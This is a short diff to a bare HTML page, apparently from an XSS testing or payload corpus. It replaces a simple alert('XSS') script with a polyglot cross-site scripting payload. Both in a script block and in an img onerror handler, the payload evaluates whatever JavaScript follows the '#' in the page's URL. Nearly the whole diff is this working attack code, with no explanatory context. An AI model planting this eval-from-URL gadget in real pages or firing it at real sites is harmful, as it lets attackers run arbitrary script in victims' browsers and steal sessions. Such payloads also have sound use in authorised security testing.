@@ -1,7 +1,14 @@
 
 <HTML>
 <HEAD>
-<SCRIPT LANGUAGE="JavaScript">alert('XSS')</SCRIPT>
+<SCRIPT LANGUAGE="JavaScript">
+  alert('XSS');
+  
+  
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(1)}">
+msgbox+1
+  
+  </SCRIPT>
 </HEAD>
 <BODY>
 </BODY>
